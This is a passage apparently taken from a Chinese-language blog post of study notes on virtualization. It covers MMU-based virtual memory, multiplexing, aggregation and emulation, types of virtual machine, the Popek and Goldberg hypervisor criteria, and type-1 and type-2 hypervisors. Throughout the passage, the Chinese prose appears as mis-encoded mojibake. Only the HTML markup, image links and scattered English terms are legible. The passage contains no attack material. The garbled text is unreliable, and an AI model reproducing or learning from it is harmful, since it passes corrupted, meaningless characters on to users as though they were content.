éœ€å…³å¿ƒåº•å±‚ç‰©ç†ç¡¬ç›˜çš„ä½ç½®ã€‚è¿™ç§æŠ½è±¡ç®€åŒ–äº†æ“ä½œï¼Œç‰¹åˆ«æ˜¯åœ¨ç¡¬ç›˜æ•…éšœæ—¶éœ€è¦æ›¿æ¢ç‰©ç†ç¡¬ç›˜æ—¶ã€‚</li></ol><p>è®¡ç®—æœºä½“ç³»ç»“æ„ä¸­çš„è™šæ‹ŸåŒ–: è™šæ‹ŸåŒ–æ˜¾ç„¶æ˜¯è®¡ç®—æœºä½“ç³»ç»“æ„çš„åŸºæœ¬ç»„æˆéƒ¨åˆ†ã€‚é€šè¿‡å†…å­˜ç®¡ç†å•å…ƒ(MMU)å…¬å¼€çš„è™šæ‹Ÿå†…å­˜å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„ä¾‹å­: MMU å¢åŠ äº†ä¸€ä¸ªé—´æ¥çº§åˆ«ï¼Œé€šå¸¸é€šè¿‡åˆ†æ®µå’Œåˆ†é¡µæœºåˆ¶çš„ç»„åˆæ¥éšè—åº”ç”¨ç¨‹åºçš„ç‰©ç†åœ°å€ã€‚ç”±äº MMU æ§åˆ¶æ“ä½œä»…é™äºå†…æ ¸æ¨¡å¼ï¼Œå› æ­¤å¼ºåŒ–äº†æ¨¡å—åŒ–ã€‚</p><p><strong>1. è™šæ‹ŸåŒ–çš„åŸºæœ¬åŸç†</strong><br>è™šæ‹ŸåŒ–æ˜¯è®¡ç®—æœºä½“ç³»ç»“æ„çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå®ƒæ—¨åœ¨æä¾›ä¸€ç§æŠ½è±¡å±‚ï¼Œä½¿ç¡¬ä»¶èµ„æºèƒ½å¤Ÿè¢«å¤šä¸ªåº”ç”¨ç¨‹åºæˆ–ç³»ç»Ÿå…±äº«ï¼ŒåŒæ—¶ä¿éšœå®‰å…¨æ€§å’Œéš”ç¦»æ€§ã€‚å…¶ä¸­ä¸€ä¸ªç»å…¸çš„è™šæ‹ŸåŒ–ç¤ºä¾‹æ˜¯é€šè¿‡å†…å­˜ç®¡ç†å•å…ƒï¼ˆMMUï¼‰å®ç°çš„è™šæ‹Ÿå†…å­˜ã€‚MMUå¼•å…¥äº†ä¸€ä¸ªé¢å¤–çš„é—´æ¥çº§åˆ«ï¼Œé€šè¿‡åˆ†æ®µå’Œåˆ†é¡µæœºåˆ¶ï¼Œå°†åº”ç”¨ç¨‹åºçš„ç‰©ç†å†…å­˜åœ°å€æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜åœ°å€ã€‚è¿™ç§æŠ€æœ¯æœ‰åŠ©äºå¢å¼ºæ¨¡å—åŒ–ï¼Œå› ä¸ºæ“ä½œç³»ç»Ÿå¯ä»¥æœ‰æ•ˆåœ°ç®¡ç†å’Œéš”ç¦»ä¸åŒåº”ç”¨ç¨‹åºçš„å†…å­˜ç©ºé—´ï¼Œä½¿å®ƒä»¬ä¼¼ä¹åœ¨ç‹¬ç«‹çš„åœ°å€ç©ºé—´ä¸­è¿è¡Œã€‚</p><p><strong>2. æ“ä½œç³»ç»Ÿä¸­çš„è™šæ‹ŸåŒ–</strong><br>è™šæ‹ŸåŒ–çš„æ¦‚å¿µä¹Ÿå¹¿æ³›åº”ç”¨äºæ“ä½œç³»ç»Ÿã€‚æ“ä½œç³»ç»Ÿçš„ä¸»è¦ä»»åŠ¡ä¹‹ä¸€æ˜¯ä¸ºå¤šä¸ªå¹¶å‘åº”ç”¨ç¨‹åºæä¾›å®‰å…¨ä¸”éš”ç¦»çš„è®¿é—®è®¡ç®—æœºèµ„æºï¼Œå¦‚CPUã€å†…å­˜å’ŒI/Oè®¾å¤‡ã€‚ä¾‹å¦‚ï¼Œæ“ä½œç³»ç»Ÿé€šè¿‡æ§åˆ¶MMUæ¥ç¡®ä¿ä¸åŒçš„è¿›ç¨‹å…·æœ‰å­¤ç«‹çš„åœ°å€ç©ºé—´ï¼Œä½¿å®ƒä»¬æ— æ³•ç›¸äº’å¹²æ‰°ã€‚æ­¤å¤–ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥åœ¨ç‰©ç†CPUæ ¸å¿ƒä¸Šé€æ˜åœ°è°ƒåº¦å¤šä¸ªçº¿ç¨‹ï¼Œä»¥å……åˆ†åˆ©ç”¨æœ‰é™çš„CPUèµ„æºï¼Œè¿™ä¹Ÿæ˜¯è™šæ‹ŸåŒ–çš„ä¸€ç§å½¢å¼ã€‚æ­¤å¤–ï¼Œæ“ä½œç³»ç»Ÿè¿˜å°†å¤šä¸ªä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿæ•´åˆåˆ°ä¸€ä¸ªè™šæ‹Ÿåç§°ç©ºé—´ä¸­ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿæ–¹ä¾¿åœ°ç®¡ç†å’Œè®¿é—®æ–‡ä»¶ã€‚</p><p><strong>3. I/Oå­ç³»ç»Ÿä¸­çš„è™šæ‹ŸåŒ–</strong><br>è™šæ‹ŸåŒ–è¿˜å¹¿æ³›åº”ç”¨äºI/Oå­ç³»ç»Ÿï¼ŒåŒ…æ‹¬ç£ç›˜å’Œç£ç›˜æ§åˆ¶å™¨ã€‚åœ¨è¿™ä¸ªé¢†åŸŸï¼Œè™šæ‹ŸåŒ–çš„æ¦‚å¿µæ¶‰åŠåˆ°å—çº§åˆ«çš„æ•°æ®è®¿é—®ã€‚ä¾‹å¦‚ï¼ŒRAIDï¼ˆå†—ä½™ç‹¬ç«‹ç£ç›˜é˜µåˆ—ï¼‰æ§åˆ¶å™¨å’Œå­˜å‚¨é˜µåˆ—ä½¿ç”¨è™šæ‹ŸåŒ–æ¥å°†å¤šä¸ªè™šæ‹Ÿç£ç›˜çš„æŠ½è±¡å‘ˆç°ç»™æ“ä½œç³»ç»Ÿï¼ŒåŒæ—¶å°†å®ƒä»¬å®é™…ä¸Šä½œä¸ºç‰©ç†ç£ç›˜è¿›è¡Œå¤„ç†ã€‚è¿™ç§è™šæ‹ŸåŒ–æŠ€æœ¯æœ‰åŠ©äºæä¾›æ•°æ®å†—ä½™å’Œæ€§èƒ½ä¼˜åŒ–ã€‚ç±»ä¼¼åœ°ï¼Œç°ä»£å›ºæ€ç¡¬ç›˜ï¼ˆSSDï¼‰ä¸­çš„Flashè½¬æ¢å±‚åœ¨I/Oå­ç³»ç»Ÿä¸­æä¾›äº†ç£¨æŸå‡è¡¡ï¼Œå¹¶å°†SSDå‘ˆç°ç»™æ“ä½œç³»ç»Ÿï¼Œå°±åƒå®ƒæ˜¯ä¸€ä¸ªä¼ ç»Ÿçš„æœºæ¢°ç¡¬ç›˜ä¸€æ ·ã€‚è¿™ç§è™šæ‹ŸåŒ–å±‚ä½¿æ“ä½œç³»ç»Ÿèƒ½å¤Ÿæœ‰æ•ˆåœ°ç®¡ç†SSDçš„ä½¿ç”¨ï¼Œå¹¶æä¾›æ›´é«˜çš„æ€§èƒ½å’Œè€ä¹…æ€§ã€‚</p><p><img src="https://img.gls.show/img/20230901154605.png"></p><p><strong>1. å¤šè·¯å¤ç”¨ï¼ˆMultiplexingï¼‰</strong> å¤šè·¯å¤ç”¨æ˜¯ä¸€ç§æŠ€æœ¯ï¼Œå®ƒå…è®¸å¤šä¸ªè™šæ‹Ÿå®ä½“å…±äº«åŒä¸€èµ„æºã€‚è¿™å¯ä»¥åœ¨ç©ºé—´å’Œæ—¶é—´ä¸¤ä¸ªæ–¹é¢å®ç°ã€‚åœ¨ç©ºé—´å¤šè·¯å¤ç”¨ä¸­ï¼Œç‰©ç†èµ„æºï¼ˆå¦‚å†…å­˜é¡µï¼‰è¢«åˆ’åˆ†ä¸ºå¤šä¸ªè™šæ‹Ÿå®ä½“ï¼Œä»¥ä¾¿å¤šä¸ªåº”ç”¨ç¨‹åºå¯ä»¥åŒæ—¶è®¿é—®å®ƒä»¬ã€‚åœ¨æ—¶é—´å¤šè·¯å¤ç”¨ä¸­ï¼Œç›¸åŒçš„ç‰©ç†èµ„æºä¼šåœ¨ä¸åŒè™šæ‹Ÿå®ä½“ä¹‹é—´è¿›è¡Œä¸´æ—¶è°ƒåº¦ï¼Œä½¿å®ƒä»¬èƒ½å¤Ÿè½®æµä½¿ç”¨èµ„æºã€‚ä¾‹å¦‚ï¼Œæ“ä½œç³»ç»Ÿè°ƒåº¦ç¨‹åºå°† CPU æ ¸å¿ƒå’Œç¡¬ä»¶çº¿ç¨‹åœ¨ä¸€ç»„å¯è¿è¡Œè¿›ç¨‹ä¹‹é—´è¿›è¡Œå¤šè·¯å¤ç”¨ã€‚ä¸Šä¸‹æ–‡åˆ‡æ¢æ“ä½œå°†å¤„ç†å™¨çš„å¯„å­˜å™¨æ–‡ä»¶ä¿å­˜åœ¨ä¸ä¼ å‡ºè¿›ç¨‹å…³è”çš„å†…å­˜ä¸­ï¼Œç„¶åä»ä¸ä¼ å…¥è¿›ç¨‹å…³è”çš„å†…å­˜ä½ç½®æ¢å¤å¯„å­˜å™¨æ–‡ä»¶çš„çŠ¶æ€ã€‚ä¾‹å¦‚ï¼Œæ“ä½œç³»ç»Ÿè·¨ä¸åŒçš„åœ°å€ç©ºé—´å¤šè·¯å¤ç”¨ä¸åŒçš„ç‰©ç†å†…å­˜é¡µã€‚ä¸ºäº†å®ç°è¿™ä¸ªç›®æ ‡ï¼Œæ“ä½œç³»ç»Ÿç®¡ç†è™šæ‹Ÿåˆ°ç‰©ç†çš„æ˜ å°„ï¼Œå¹¶ä¾èµ–äº MMU æä¾›çš„æ¶æ„æ”¯æŒã€‚<br><strong>2. èšåˆï¼ˆAggregationï¼‰</strong> èšåˆæ˜¯æŒ‡å°†å¤šä¸ªç‰©ç†èµ„æºç»„åˆæˆä¸€ä¸ªå•ä¸€çš„æŠ½è±¡èµ„æºã€‚è¿™æ„å‘³ç€å¤šä¸ªç‰©ç†èµ„æºè¢«æ±‡æ€»åœ¨ä¸€èµ·ï¼Œä»¥å½¢æˆä¸€ä¸ªæ›´å¤§æˆ–æ›´å¤æ‚çš„èµ„æºã€‚ä¾‹å¦‚ï¼ŒRAIDï¼ˆå†—ä½™ç‹¬ç«‹ç£ç›˜é˜µåˆ—ï¼‰æ§åˆ¶å™¨å°†å¤šä¸ªç¡¬ç›˜èšåˆæˆä¸€ä¸ªå·ï¼Œä»è€Œæä¾›äº†å†—ä½™å’Œæ€§èƒ½ä¼˜åŒ–ã€‚èšåˆåï¼Œæ‰€æœ‰å¯¹å·çš„è¯»å†™æ“ä½œéƒ½ä¼šè¢«é€‚å½“åœ°åæ˜ åœ¨åº•å±‚çš„ç‰©ç†ç£ç›˜ä¸Šã€‚<br><strong>3. æ¨¡æ‹Ÿï¼ˆEmulationï¼‰</strong> æ¨¡æ‹Ÿæ˜¯é€šè¿‡è½¯ä»¶ä¸­çš„é—´æ¥çº§åˆ«æ¥æ¨¡ä»¿ç‰©ç†èµ„æºæˆ–è®¾å¤‡çš„æŠ€æœ¯ã€‚è¿™æ„å‘³ç€è™šæ‹Ÿèµ„æºæˆ–è®¾å¤‡å¯ä»¥åœ¨å½“å‰è®¡ç®—æœºç³»ç»Ÿä¸­å¹¶ä¸å­˜åœ¨çš„æƒ…å†µä¸‹è¢«æ¨¡æ‹Ÿå‡ºæ¥ã€‚ä¾‹å¦‚ï¼Œè·¨æ¶æ„æ¨¡æ‹Ÿå™¨å¯ä»¥åœ¨ä¸€ç§å¤„ç†å™¨æ¶æ„ä¸Šæ¨¡æ‹Ÿå¦ä¸€ç§å¤„ç†å™¨æ¶æ„ï¼Œä»¥å®ç°å‘ä¸‹å…¼å®¹æ€§ã€‚è¿™ç§æŠ€æœ¯ä½¿å¾—åœ¨ä¸åŒçš„ç¡¬ä»¶æˆ–è½¯ä»¶ç¯å¢ƒä¸­è¿è¡Œåº”ç”¨ç¨‹åºæˆä¸ºå¯èƒ½ã€‚<br><strong>å¤šè·¯å¤ç”¨ã€èšåˆå’Œæ¨¡æ‹Ÿ</strong>ä¸‰ç§æŠ€æœ¯é€šå¸¸å¯ä»¥è‡ªç„¶åœ°ç»“åˆåœ¨ä¸€èµ·ï¼Œå½¢æˆä¸€ä¸ªå®Œæ•´çš„è™šæ‹ŸåŒ–æ‰§è¡Œå †æ ˆã€‚ä¾‹å¦‚ï¼Œåœ¨è™šæ‹Ÿæœºç›‘è§†å™¨ï¼ˆVMï¼‰ä¸­ï¼Œå¤šè·¯å¤ç”¨å’Œæ¨¡æ‹Ÿé€šå¸¸ä¸€èµ·ä½¿ç”¨ã€‚VMå¯ä»¥å¤šè·¯å¤ç”¨å¤šä¸ªè™šæ‹Ÿæœºå®ä¾‹åœ¨åŒä¸€ç‰©ç†æœåŠ¡å™¨ä¸Šè¿è¡Œï¼ŒåŒæ—¶é€šè¿‡æ¨¡æ‹Ÿæä¾›å¯¹è™šæ‹Ÿèµ„æºçš„è®¿é—®ï¼Œä½¿è™šæ‹Ÿæœºå®ä¾‹ä¼¼ä¹æ‹¥æœ‰è‡ªå·±çš„ç‹¬ç«‹èµ„æºã€‚</p><h2 id="1-2-è™šæ‹Ÿæœº"><a href="#1-2-è™šæ‹Ÿæœº" class="headerlink" title="1.2 è™šæ‹Ÿæœº"></a>1.2 è™šæ‹Ÿæœº</h2><p>è™šæ‹Ÿæœºæ˜¯ä¸€ä¸ªå®Œæ•´çš„è®¡ç®—ç¯å¢ƒï¼Œå…·æœ‰ç‹¬ç«‹çš„å¤„ç†èƒ½åŠ›ã€å†…å­˜å’Œé€šä¿¡é€šé“ã€‚</p><p>åŸºäºè¯­è¨€çš„è™šæ‹Ÿæœºï¼Œä¾‹å¦‚ Java è™šæ‹Ÿæœºã€å¾®è½¯é€šç”¨è¯­è¨€è¿è¡Œåº“ã€åµŒå…¥æµè§ˆå™¨çš„ Javascript å¼•æ“ï¼Œä»¥åŠä¸€èˆ¬æ¥è¯´ä»»ä½•æ‰˜ç®¡è¯­è¨€çš„è¿è¡Œæ—¶ç¯å¢ƒã€‚è¿™äº›è¿è¡Œæ—¶ç¯å¢ƒå…³æ³¨äºè¿è¡Œå•ä¸ªåº”ç”¨ç¨‹åºï¼Œå¹¶ä¸åœ¨æœ¬ä¹¦çš„èŒƒå›´ä¹‹å†…; </p><p>è½»é‡çº§è™šæ‹Ÿæœºï¼Œå®ƒä¾èµ–äºç¡¬ä»¶å’Œè½¯ä»¶éš”ç¦»æœºåˆ¶çš„ç»„åˆï¼Œä»¥ç¡®ä¿ç›´æ¥åœ¨å¤„ç†å™¨ä¸Šè¿è¡Œçš„åº”ç”¨ç¨‹åº(ä¾‹å¦‚ï¼Œä½œä¸ºæœ¬åœ° x86ä»£ç )ä¸å…¶ä»–æ²™ç®±å’Œåº•å±‚æ“ä½œç³»ç»Ÿå®‰å…¨éš”ç¦»ã€‚Is åŒ…æ‹¬ä»¥æœåŠ¡å™¨ä¸ºä¸­å¿ƒçš„ç³»ç»Ÿï¼Œå¦‚ Denali [182] ï¼Œä»¥åŠä»¥æ¡Œé¢ä¸ºä¸­å¿ƒçš„ç³»ç»Ÿï¼Œå¦‚ Google Native Client [190]å’Œ Vx32[71]ã€‚</p><ol><li><strong>Vx32</strong>ï¼šç±»ä¼¼äºGoogle Native Clientçš„ç³»ç»Ÿï¼Œæ—¨åœ¨æä¾›æ¡Œé¢ç³»ç»Ÿä¸­çš„æœ¬æœºä»£ç æ‰§è¡Œçš„å®‰å…¨æ€§å’Œéš”ç¦»ã€‚</li><li><strong>Google Native Client</strong>ï¼šè¿™æ˜¯ä¸€ä¸ªç”¨äºæ¡Œé¢ç³»ç»Ÿçš„æŠ€æœ¯ï¼Œå…è®¸åœ¨Webæµè§ˆå™¨ä¸­è¿è¡Œæœ¬æœºä»£ç ï¼ŒåŒæ—¶æä¾›äº†å®‰å…¨æ€§éš”ç¦»ï¼Œä»¥é˜²æ­¢æ¶æ„ä»£ç å¯¹ç³»ç»Ÿé€ æˆæŸå®³ã€‚</li></ol><p>åŸºäº Linux å®¹å™¨çš„è§£å†³æ–¹æ¡ˆï¼Œå¦‚ Docker [129]æˆ–ç›¸åº”çš„ FreeBSD Jail [110] ï¼Œä¹Ÿå±äºåŒä¸€ç±»åˆ«ã€‚</p><p>ç³»ç»Ÿçº§è™šæ‹Ÿæœºï¼Œå…¶ä¸­ç‹¬ç«‹çš„è®¡ç®—ç¯å¢ƒç±»ä¼¼äºè®¡ç®—æœºçš„ç¡¬ä»¶ï¼Œå› æ­¤è™šæ‹Ÿæœºå¯ä»¥è¿è¡Œä¸€ä¸ªæ ‡å‡†çš„ã€å•†å“åŒ–çš„æ“ä½œç³»ç»ŸåŠå…¶åº”ç”¨ç¨‹åºï¼Œä¸å…¶ä»–è™šæ‹Ÿæœºå’Œç¯å¢ƒçš„å…¶ä»–éƒ¨åˆ†å®Œå…¨éš”ç¦»ã€‚è¿™ç§è™šæ‹Ÿæœºå°†è™šæ‹ŸåŒ–åŸç†åº”ç”¨äºæ•´ä¸ªè®¡ç®—æœºç³»ç»Ÿã€‚æ¯ä¸ªè™šæ‹Ÿæœºéƒ½æœ‰è‡ªå·±çš„åº•å±‚ç¡¬ä»¶å‰¯æœ¬ï¼Œæˆ–è€…è‡³å°‘æœ‰è‡ªå·±çš„åº•å±‚ç¡¬ä»¶å‰¯æœ¬ã€‚æ¯ä¸ªè™šæ‹Ÿæœºéƒ½è¿è¡Œè‡ªå·±ç‹¬ç«‹çš„æ“ä½œç³»ç»Ÿå®ä¾‹ï¼Œç§°ä¸ºæ¥å®¾æ“ä½œç³»ç»Ÿã€‚æ˜¯è¿™æœ¬ä¹¦çš„é‡ç‚¹ã€‚</p><p><img src="https://img.gls.show/img/20230901155948.png"></p><p>å›¾1.2è¿˜å¯¹è¿è¡Œç³»ç»Ÿçº§è™šæ‹Ÿæœºçš„å„ç§å¹³å°è¿›è¡Œäº†åˆ†ç±»ã€‚æˆ‘ä»¬å°†è¿™äº›å¹³å°ç§°ä¸ºç³»ç»Ÿç®¡ç†ç¨‹åºæˆ–æœºå™¨æ¨¡æ‹Ÿå™¨ï¼Œå…·ä½“å–å†³äºè¿è¡Œè™šæ‹Ÿæœºæ‰€ä½¿ç”¨çš„æŠ€æœ¯:<br>ç³»ç»Ÿç®¡ç†ç¨‹åºä¾èµ–äº CPU ä¸Šçš„ç›´æ¥æ‰§è¡Œä»¥è·å¾—æœ€å¤§æ•ˆç‡ï¼Œç†æƒ³æƒ…å†µä¸‹å¯ä»¥å®Œå…¨æ¶ˆé™¤æ€§èƒ½å¼€é”€ã€‚åœ¨ç›´æ¥æ‰§è¡Œæ—¶ï¼Œç³»ç»Ÿç®¡ç†ç¨‹åºè®¾ç½®ç¡¬ä»¶ç¯å¢ƒï¼Œç„¶åè®©è™šæ‹ŸæœºæŒ‡ä»¤ç›´æ¥åœ¨å¤„ç†å™¨ä¸Šæ‰§è¡Œã€‚ç”±äºè¿™äº›æŒ‡ä»¤åºåˆ—å¿…é¡»åœ¨è™šæ‹Ÿæœºçš„æŠ½è±¡ä¸­æ“ä½œï¼Œå®ƒä»¬çš„æ‰§è¡Œä¼šå¯¼è‡´é™·é˜±ï¼Œè™šæ‹Ÿæœºç›‘æ§ç¨‹åºå¿…é¡»æ¨¡æ‹Ÿè¿™äº›é™·é˜±ã€‚</p><p>æœºå™¨æ¨¡æ‹Ÿå™¨é€šå¸¸ä½œä¸ºä¸€ä¸ªæ™®é€šçš„ç”¨æˆ·çº§åº”ç”¨ç¨‹åºæ¥å®ç°ï¼Œç›®æ ‡æ˜¯æä¾›ä¸€ä¸ªç²¾ç¡®çš„è™šæ‹ŸåŒ–æ¶æ„æ¨¡æ‹Ÿï¼Œå¹¶ä¸”ç»å¸¸ä»¥æœ¬æœºé€Ÿåº¦çš„ä¸€å°éƒ¨åˆ†è¿è¡Œï¼Œä»5xå‡é€Ÿåˆ°1000xï¼Œè¿™å–å†³äºæ¨¡æ‹Ÿç»†èŠ‚çš„çº§åˆ«ã€‚æœºå™¨æ¨¡æ‹Ÿå™¨åœ¨è®¡ç®—æœºä½“ç³»ç»“æ„ä¸­èµ·ç€åŸºç¡€æ€§çš„ä½œç”¨ï¼Œå®ƒå…è®¸å¯¹å¤æ‚çš„å·¥ä½œè´Ÿè½½è¿›è¡Œè¯¦ç»†çš„ä½“ç³»ç»“æ„ç ”ç©¶ã€‚</p><h2 id="1-3-ç³»ç»Ÿç®¡ç†ç¨‹åº"><a href="#1-3-ç³»ç»Ÿç®¡ç†ç¨‹åº" class="headerlink" title="1.3 ç³»ç»Ÿç®¡ç†ç¨‹åº"></a>1.3 ç³»ç»Ÿç®¡ç†ç¨‹åº</h2><p>ç³»ç»Ÿç®¡ç†ç¨‹åºæ˜¯ä¸€ç§ç‰¹æ®Šå½¢å¼çš„ç³»ç»Ÿè½¯ä»¶ï¼Œå®ƒè¿è¡Œè™šæ‹Ÿæœºï¼Œä»¥æœ€å°åŒ–æ‰§è¡Œå¼€é”€ä¸ºç›®æ ‡ã€‚å½“å¤šä¸ªè™šæ‹Ÿæœºåœ¨åŒä¸€è®¡ç®—æœºç³»ç»Ÿä¸ŠåŒæ—¶å…±å­˜æ—¶ï¼Œè™šæ‹Ÿæœºç›‘æ§ç¨‹åºä¼šåœ¨è™šæ‹Ÿæœºä¹‹é—´é€‚å½“åœ°åˆ†é…å’Œè°ƒåº¦ç‰©ç†èµ„æºã€‚Popek å’Œ Goldberg åœ¨1974å¹´æ­£å¼ç¡®å®šäº†è™šæ‹Ÿæœºå’Œ hypervisor (ä»–ä»¬ç§°ä¹‹ä¸º VMM)ä¹‹é—´çš„å…³ç³»ï¼Œå¦‚ä¸‹æ‰€ç¤º[143]ã€‚</p><blockquote><p>è™šæ‹Ÿæœºè¢«è®¤ä¸ºæ˜¯çœŸå®æœºå™¨çš„æœ‰æ•ˆçš„ã€å­¤ç«‹çš„å¤åˆ¶å“ã€‚æˆ‘ä»¬é€šè¿‡è™šæ‹Ÿæœºç›‘è§†å™¨(VMM)çš„æ¦‚å¿µæ¥è§£é‡Šè¿™äº›æ¦‚å¿µã€‚ä½œä¸ºè½¯ä»¶çš„ä¸€éƒ¨åˆ†ï¼ŒVMM å…·æœ‰ä¸‰ä¸ªåŸºæœ¬ç‰¹å¾ã€‚é¦–å…ˆï¼ŒVMM ä¸ºç¨‹åºæä¾›äº†ä¸€ä¸ªä¸åŸå§‹æœºå™¨åŸºæœ¬ç›¸åŒçš„ç¯å¢ƒ; å…¶æ¬¡ï¼Œåœ¨è¿™ä¸ªç¯å¢ƒä¸­è¿è¡Œçš„ç¨‹åºåœ¨æœ€åçš„æƒ…å†µä¸‹åªæ˜¾ç¤ºé€Ÿåº¦çš„è½»å¾®ä¸‹é™; æœ€åï¼ŒVMM å®Œå…¨æ§åˆ¶ç³»ç»Ÿèµ„æºã€‚</p></blockquote><p>Popek å’Œ Goldberg çš„å®šä¹‰ä¸æ›´å¹¿æ³›çš„è™šæ‹ŸåŒ–å®šä¹‰æ˜¯ä¸€è‡´çš„: ç®¡ç†ç¨‹åºå°†åˆ†å±‚åŸåˆ™åº”ç”¨äºè®¡ç®—æœºï¼Œå¹¶å…·æœ‰ä¸‰ä¸ªç‰¹å®šçš„æ ‡å‡†: ç­‰ä»·æ€§ã€å®‰å…¨æ€§å’Œæ€§èƒ½ã€‚</p><p>ç­‰ä»·æ€§: å¤åˆ¶ç¡®ä¿å…¬å¼€çš„èµ„æº(å³è™šæ‹Ÿæœº)ä¸åº•å±‚è®¡ç®—æœºç­‰ä»·ã€‚æ˜¯ä¸€ä¸ªå¼ºå¤§çš„éœ€æ±‚ï¼Œå½“ä½“ç³»ç»“æ„éœ€è¦å®ƒæ—¶ï¼Œå®ƒåœ¨æŸç§ç¨‹åº¦ä¸Šè¢«æ”¾å®½äº†(è§1.7)ã€‚</p><blockquote><p><strong>å¤åˆ¶ï¼ˆDuplicationï¼‰</strong>ï¼šåœ¨è™šæ‹ŸåŒ–ä¸­ï¼Œå¤åˆ¶æŒ‡çš„æ˜¯è™šæ‹Ÿæœºä¸åº•å±‚ç‰©ç†è®¡ç®—æœºä¹‹é—´çš„ç­‰æ•ˆæ€§ã€‚è¿™æ„å‘³ç€è™šæ‹Ÿæœºåº”è¯¥åœ¨æ“ä½œå’Œæ€§èƒ½æ–¹é¢è¡¨ç°å¾—åƒåº•å±‚ç‰©ç†è®¡ç®—æœºä¸€æ ·ï¼Œä»¥ä¾¿åº”ç”¨ç¨‹åºä¸éœ€è¦å…³å¿ƒå®ƒä»¬æ˜¯å¦åœ¨è™šæ‹Ÿç¯å¢ƒä¸­è¿è¡Œã€‚è¿™ç§ç­‰æ•ˆæ€§æ˜¯è™šæ‹ŸåŒ–æŠ€æœ¯çš„ä¸€ä¸ªæ ¸å¿ƒç›®æ ‡ã€‚</p></blockquote><p>å®‰å…¨æ€§: éš”ç¦»è¦æ±‚è™šæ‹Ÿæœºå½¼æ­¤ä¹‹é—´ä»¥åŠè™šæ‹Ÿæœºç›‘æ§ç¨‹åºä¹‹é—´éƒ½æ˜¯éš”ç¦»çš„ï¼Œè¿™å¼ºåˆ¶äº†ç³»ç»Ÿçš„æ¨¡å—æ€§ã€‚è‡³å…³é‡è¦çš„æ˜¯ï¼Œç³»ç»Ÿç®¡ç†ç¨‹åºå¼ºåˆ¶æ‰§è¡Œè®¾è®¡çš„å®‰å…¨æ€§ï¼Œè€Œä¸å¯¹è¿è¡Œåœ¨è™šæ‹Ÿæœº(åŒ…æ‹¬å®¢æˆ·æ“ä½œç³»ç»Ÿ)ä¸­çš„è½¯ä»¶åšä»»ä½•å‡è®¾ã€‚</p><p>æ€§èƒ½: æœ€åï¼Œä¹Ÿæ˜¯æœ€å…³é”®çš„ä¸€ç‚¹ï¼ŒPopek å’Œ Goldberg çš„å®šä¹‰å¢åŠ äº†ä¸€ä¸ªé¢å¤–çš„è¦æ±‚: è™šæ‹Ÿç³»ç»Ÿå¿…é¡»åœ¨æœ€åçš„æƒ…å†µä¸‹æ˜¾ç¤ºé€Ÿåº¦çš„è½»å¾®ä¸‹é™ã€‚æ˜¯å°†è™šæ‹Ÿæœºç›‘æ§ç¨‹åºä¸æœºå™¨<strong>æ¨¡æ‹Ÿå™¨</strong>åˆ†ç¦»çš„æœ€ç»ˆè¦æ±‚ã€‚å°½ç®¡æœºå™¨æ¨¡æ‹Ÿå™¨ä¹Ÿæ»¡è¶³å¤åˆ¶å’Œéš”ç¦»æ ‡å‡†ï¼Œä½†å®ƒä»¬ä¸ç¬¦åˆæ•ˆç‡æ ‡å‡†ï¼Œå› ä¸º<strong>å³ä½¿æ˜¯ä½¿ç”¨åŠ¨æ€äºŒè¿›åˆ¶è½¬æ¢çš„å¿«é€Ÿæœºå™¨æ¨¡æ‹Ÿå™¨</strong>[32,124,153,184]ä¹Ÿå°†ç›®æ ‡ç³»ç»Ÿçš„æ‰§è¡Œé€Ÿåº¦è‡³å°‘å‡æ…¢äº†5xï¼Œè¿™åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯å› ä¸ºåœ¨è½¯ä»¶ä¸­æ¨¡æ‹Ÿè™šæ‹Ÿæœºçš„ TLB çš„æˆæœ¬å¾ˆé«˜ã€‚</p><h2 id="1-4-TYPE-1-AND-TYPE-2-HYPERVISORS"><a href="#1-4-TYPE-1-AND-TYPE-2-HYPERVISORS" class="headerlink" title="1.4 TYPE-1 AND TYPE-2 HYPERVISORS"></a>1.4 TYPE-1 AND TYPE-2 HYPERVISORS</h2><p>ç³»ç»Ÿç®¡ç†ç¨‹åºä½“ç³»ç»“æ„å¯ä»¥åˆ†ä¸ºæ‰€è°“çš„ type-1å’Œ type-2ã€‚ç½—ä¼¯ç‰¹ Â· æˆˆå¾·å ¡åœ¨ä»–çš„è®ºæ–‡[77]ä¸­ä»‹ç»äº†è¿™äº›æœ¯è¯­ï¼Œè‡ªé‚£ä»¥åè¿™äº›æœ¯è¯­ä¸€ç›´è¢«ä½¿ç”¨ã€‚éæ­£å¼åœ°ï¼Œtype-1ç®¡ç†ç¨‹åºç›´æ¥æ§åˆ¶ç‰©ç†è®¡ç®—æœºçš„æ‰€æœ‰èµ„æºã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œtype-2è™šæ‹Ÿæœºç›‘æ§ç¨‹åºå¯ä»¥â€œä½œä¸ºâ€ç°æœ‰ä¸»æœºæ“ä½œç³»ç»Ÿçš„ä¸€éƒ¨åˆ†æˆ–â€œåœ¨â€ç°æœ‰ä¸»æœºæ“ä½œç³»ç»Ÿçš„â€œä¸Šé¢â€æ“ä½œã€‚é—æ†¾çš„æ˜¯ï¼Œæ–‡çŒ®ä¸­å¯¹è¿™äº›å®šä¹‰çš„åº”ç”¨æ¯”è¾ƒæ¾æ•£ï¼Œå¯¼è‡´äº†ä¸€äº›æ··ä¹±ã€‚Goldberg çš„å®šä¹‰(ä½¿ç”¨æ›´æ–°çš„æœ¯è¯­)å¦‚ä¸‹ï¼š</p><ul><li>è™šæ‹ŸåŒ–çš„ä¸€ä¸ªåŸºæœ¬è¦æ±‚ï¼Œå³è™šæ‹Ÿæœºä¸­çš„æŒ‡ä»¤åº”è¯¥ç›´æ¥åœ¨ä¸»æœºç¡¬ä»¶ä¸Šæ‰§è¡Œï¼Œè€Œä¸éœ€è¦è¿›è¡Œé¢å¤–çš„è§£é‡Šæˆ–ç¿»è¯‘ã€‚è¿™æœ‰åŠ©äºç¡®ä¿è™šæ‹Ÿæœºçš„æ€§èƒ½æ¥è¿‘äºè¿è¡Œåœ¨è£¸æœºä¸Šçš„åŸç”Ÿåº”ç”¨ç¨‹åºã€‚</li><li><strong>Type-1å’ŒType-2 VMM</strong>ï¼š<ul><li><strong>Type-1 